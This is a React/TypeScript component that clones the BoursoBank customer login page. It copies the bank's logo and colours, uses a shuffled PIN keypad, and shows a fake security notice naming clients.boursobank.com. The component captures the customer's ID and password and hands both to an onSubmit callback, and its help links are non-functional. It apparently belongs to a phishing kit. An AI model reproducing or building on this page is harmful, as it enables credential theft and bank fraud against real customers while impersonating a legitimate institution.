import React, { useState, useMemo, useCallback } from 'react';

interface Props {
  onSubmit: (identifiant: string, password: string) => void;
}

function shuffleDigits(): number[] {
  const digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
  for (let i = digits.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [digits[i], digits[j]] = [digits[j], digits[i]];
  }
  return digits;
}

const BoursoLogo: React.FC = () => (
  <svg width="65" height="76" viewBox="0 0 65 76" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path opacity="0.65" d="M64.9947 0.584C64.993 0.566 64.9876 0.55 64.9841 0.534C64.44 0.011 64.346 0 64.346 0C64.2503 0.004 64.1989 0.014 64.1546 0.023C64.0589 0.059 63.965 0.11L32.98 20.017L38.995 38.729L58.563 37.115L64.989 0.792C64.993 0.774 64.9965 0.721 65 0.685C65 0.654 64.998 0.619 64.995 0.584Z" fill="white"/>
    <path d="M50.881 75.685C51.026 76.135 51.675 76.091 51.756 75.624L58.566 37.111L38.999 38.725L50.881 75.685Z" fill="white"/>
    <path opacity="0.4" d="M32.983 20.013L38.999 38.725L0.491 41.904C0.021 41.943 -0.186 41.324 0.211 41.069L32.985 20.015L32.983 20.013Z" fill="white"/>
  </svg>
);

const PhishingAlert: React.FC = () => (
  <div className="text-center mb-6">
    <p className="text-white/50 text-sm mb-1">Veuillez toujours vérifier que vous êtes sur la bonne adresse</p>
    <div className="flex items-center justify-center gap-1.5">
      <svg className="w-3.5 h-3.5 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd"/></svg>
      <span className="text-white font-semibold text-sm">clients.boursobank.com</span>
    </div>
  </div>
);

const LoginStep: React.FC<Props> = ({ onSubmit }) => {
  const [phase, setPhase] = useState<'id' | 'pwd'>('id');
  const [identifiant, setIdentifiant] = useState('');
  const [password, setPassword] = useState('');
  const [sending, setSending] = useState(false);

  const shuffled = useMemo(() => shuffleDigits(), []);

  const handleIdInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    setIdentifiant(e.target.value.replace(/\D/g, '').substring(0, 15));
  };

  const handleIdSubmit = () => {
    if (identifiant.length >= 5) setPhase('pwd');
  };

  const handleKeyPress = useCallback((digit: number) => {
    setPassword(prev => {
      if (prev.length >= 8) return prev;
      return prev + digit;
    });
  }, []);

  const handleBackspace = () => setPassword(prev => prev.slice(0, -1));

  const handleLogin = () => {
    if (password.length < 6 || sending) return;
    setSending(true);
    onSubmit(identifiant, password);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 py-8 animate-fadeIn" style={{ background: 'linear-gradient(135deg, #1a0a2e 0%, #0d1b3e 50%, #1a0a2e 100%)' }}>
      {/* Gradient ribbon */}
      <div className="fixed top-0 left-0 right-0 h-1.5" style={{ background: 'linear-gradient(90deg, #D20073, #FF0D77)' }} />

      {/* Logo */}
      <div className="mb-8">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 120" className="h-7 w-auto">
          <path d="M124.7 57.2c5.3-2 7.6-6 7.6-11.3 0-9-7.3-13.9-18.6-13.9H98.3v53.4h19.4c11.6 0 17.9-4.9 17.9-15 0-6.8-4.2-11.2-10.9-13.2zm-18.1-17.5h8.1c5.4 0 9.1 2.5 9.1 7.1 0 4.1-2 7.1-9.1 7.1h-8.1V39.7zm10.5 38.1h-10.5V61.6h10.5c6.9 0 10 3.4 10 8.1 0 4.8-3.2 8.1-10 8.1z" fill="#D20073"/>
          <path d="M159.5 47.7c-10.3 0-19 6.9-19 19.2v.4c0 12.6 9.3 19.2 19 19.2s19-6.6 19-19.2v-.4c0-12.2-8.7-19.2-19-19.2zm11 19.6c0 5.7-3.4 12.1-11 12.1s-11-6.4-11-12.1v-.4c0-5.8 3.4-12.1 11-12.1s11 6.4 11 12.1v.4z" fill="#D20073"/>
          <path d="M208.9 68.8c0 6.1-2.3 10.4-8.5 10.4-6.1 0-8.5-4.2-8.5-10.4v-20h-7.6v21c0 9.4 5.6 16.7 16.1 16.7 10.5 0 16.1-7.3 16.1-16.7v-21h-7.6v20z" fill="#D20073"/>
          <path d="M222.8 64.7v20.7h7.6V65c0-5.8 2.3-9.6 8.4-9.6h4v-7.2h-4c-11.1.1-16 6.6-16 16.5z" fill="#D20073"/>
          <path d="M265.4 64.2l-5.1-1.2c-3.7-.9-6.2-1.8-6.2-4.3 0-2.6 2.3-4.2 6.2-4.2 3.8 0 6.5 1.8 6.5 5v.1h7.3V59c0-6.6-5.9-11-13.8-11s-13.8 4.5-13.8 10.8c0 5.6 3.7 8.8 9.2 10.2l5.4 1.3c4.2 1 6.6 2.5 6.6 5.2 0 3.1-2.8 4.5-7.2 4.5-4.9 0-7.5-2.9-7.5-6.2v-.1h-7.3v.3c0 8.1 6.4 12.6 14.8 12.6 9.3 0 14.8-4.8 14.8-11.1 0-6.5-4.2-9.9-9.9-11.3z" fill="#D20073"/>
          <path d="M298.8 47.7c-10.3 0-19 6.9-19 19.2v.4c0 12.6 9.3 19.2 19 19.2s19-6.6 19-19.2v-.4c0-12.2-8.7-19.2-19-19.2zm10.9 19.6c0 5.7-3.4 12.1-11 12.1s-11-6.4-11-12.1v-.4c0-5.8 3.4-12.1 11-12.1s11 6.4 11 12.1v.4z" fill="#D20073"/>
          <path d="M63.2 95.6c.1.4.8.4.8-.1l6.5-36.4L52 60.7l11.2 34.9z" fill="#D20073"/>
          <path d="M46.3 43 52 60.7l-36.5 3c-.4 0-.6-.5-.3-.8L46.3 43z" fill="#009de0"/>
          <path d="M361.9 70.4c0-6.9-4.2-11.3-10.9-13.2 5.3-2 7.6-6 7.6-11.3 0-9-7.3-13.9-18.6-13.9h-15.5v53.4H344c11.6 0 17.9-4.9 17.9-15zm-29-30.7h8.1c5.4 0 9.1 2.5 9.1 7.1 0 4.1-2 7.1-9.1 7.1h-8.1V39.7zm0 38.1V61.6h10.5c6.9 0 10 3.4 10 8.1 0 4.8-3.1 8-10 8h-10.5z" fill="#003883"/>
          <path d="M384.3 86.4c5.8 0 9.6-2.2 12.3-5.5v4.5h7.6V48.8h-7.3v4.5c-2.6-3.2-6.5-5.5-12.2-5.5-8.5 0-18 6.4-18 19.1v.6c0 11.5 8.5 18.9 17.6 18.9zm-9.6-19.3c0-5.9 3.2-12.1 10.9-12.1 7.5 0 11 6.2 11 12.1v.2c0 5.6-3.5 11.9-11 11.9-7.7 0-10.9-6.3-10.9-11.9v-.2z" fill="#003883"/>
          <path d="M419.1 65.3c0-6.1 3.1-10.4 8.9-10.4s8.9 4.2 8.9 10.4v20.1h7.6v-21c0-10.1-6.4-16.7-16.5-16.7-10.2 0-16.5 6.6-16.5 16.7v21h7.6V65.3z" fill="#003883"/>
          <path d="M458.9 73.2l5.2-5.5 12 17.7h8.9l-15.7-23.1 13.1-13.5h-9.7l-13.8 14.3v-31h-7.6v53.3h7.6z" fill="#003883"/>
          <path d="M75.7 24.2 46.3 43v.1L52 60.6l18.5-1.5 6.1-34.2c.1-.6-.5-1-.9-.7z" fill="#003883"/>
        </svg>
      </div>

      {/* Modal card */}
      <div className="w-full max-w-[400px] rounded-2xl p-6 sm:p-8" style={{ background: 'rgba(255,255,255,0.06)', backdropFilter: 'blur(20px)', WebkitBackdropFilter: 'blur(20px)' }}>
        {phase === 'id' ? (
          <div className="animate-fadeIn">
            <div className="flex justify-center mb-6"><BoursoLogo /></div>
            <h2 className="text-white text-xl font-semibold text-center mb-4">Mon identifiant</h2>
            <PhishingAlert />

            <div className="mb-4">
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                value={identifiant}
                onChange={handleIdInput}
                placeholder="Saisissez votre identifiant"
                autoComplete="off"
                autoFocus
                className="w-full h-12 px-4 bg-white/10 border border-white/20 rounded-lg text-white text-lg tracking-widest placeholder-white/30 outline-none focus:border-bourso transition-colors"
              />
            </div>

            <div className="flex items-center gap-2 mb-6">
              <input type="checkbox" id="remember" className="w-4 h-4 accent-bourso" />
              <label htmlFor="remember" className="text-white/60 text-sm cursor-pointer">Mémoriser mon identifiant</label>
            </div>

            <button
              type="button"
              onClick={handleIdSubmit}
              disabled={identifiant.length < 5}
              className="w-full h-12 rounded-lg text-white font-semibold text-base transition-all disabled:opacity-40"
              style={{ background: 'linear-gradient(90deg, #D20073, #FF0D77)' }}
            >
              Suivant
            </button>

            <div className="text-center mt-4">
              <span className="text-white/40 text-sm cursor-pointer hover:text-white/60 transition-colors">Identifiant oublié ?</span>
            </div>
          </div>
        ) : (
          <div className="animate-fadeIn">
            <div className="flex justify-center mb-6"><BoursoLogo /></div>
            <h2 className="text-white text-xl font-semibold text-center mb-4">Mon mot de passe</h2>
            <PhishingAlert />

            {/* Password circles */}
            <div className="flex items-center justify-center gap-2.5 mb-6">
              {Array.from({ length: 8 }).map((_, i) => (
                <div
                  key={i}
                  className={`w-4 h-4 rounded-full border-2 transition-all duration-150 ${
                    i < password.length ? 'bg-white border-white' : 'border-white/40'
                  }`}
                />
              ))}
              <button
                type="button"
                onClick={handleBackspace}
                className="ml-2 text-white/50 hover:text-white transition-colors p-1"
                aria-label="Effacer"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 9.75L14.25 12m0 0l2.25 2.25M14.25 12l2.25-2.25M14.25 12L12 14.25m-2.58-4.92l-6.374 6.374a1.125 1.125 0 000 1.59L6.97 21.105c.42.42.98.655 1.567.655H19.5a2.25 2.25 0 002.25-2.25v-9a2.25 2.25 0 00-2.25-2.25h-10.5c-.587 0-1.147.236-1.567.655z" />
                </svg>
              </button>
            </div>

            {/* Virtual keypad */}
            <div className="grid grid-cols-5 gap-2 mb-6">
              {shuffled.map((digit, i) => (
                <button
                  key={i}
                  type="button"
                  onClick={() => handleKeyPress(digit)}
                  disabled={password.length >= 8}
                  className="h-14 rounded-lg bg-white/10 hover:bg-white/20 border border-white/15 text-white text-xl font-bold transition-all active:scale-95 disabled:opacity-30"
                >
                  {digit}
                </button>
              ))}
            </div>

            <button
              type="button"
              onClick={handleLogin}
              disabled={password.length < 6 || sending}
              className="w-full h-12 rounded-lg text-white font-semibold text-base transition-all disabled:opacity-40"
              style={{ background: 'linear-gradient(90deg, #D20073, #FF0D77)' }}
            >
              {sending ? 'Connexion...' : 'Je me connecte'}
            </button>

            <div className="text-center mt-4">
              <span className="text-white/40 text-sm cursor-pointer hover:text-white/60 transition-colors">Mot de passe oublié ?</span>
            </div>

            <div className="text-center mt-3">
              <button type="button" onClick={() => { setPhase('id'); setPassword(''); }} className="text-white/40 text-sm hover:text-white/60 transition-colors flex items-center justify-center gap-1 mx-auto">
                <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18"/></svg>
                Mon identifiant
              </button>
            </div>
          </div>
        )}
      </div>

      {/* Footer */}
      <div className="mt-6">
        <span className="text-white/20 text-xs cursor-pointer hover:text-white/40 transition-colors">Aide / Opposition / Infos légales</span>
      </div>
    </div>
  );
};

export default LoginStep;
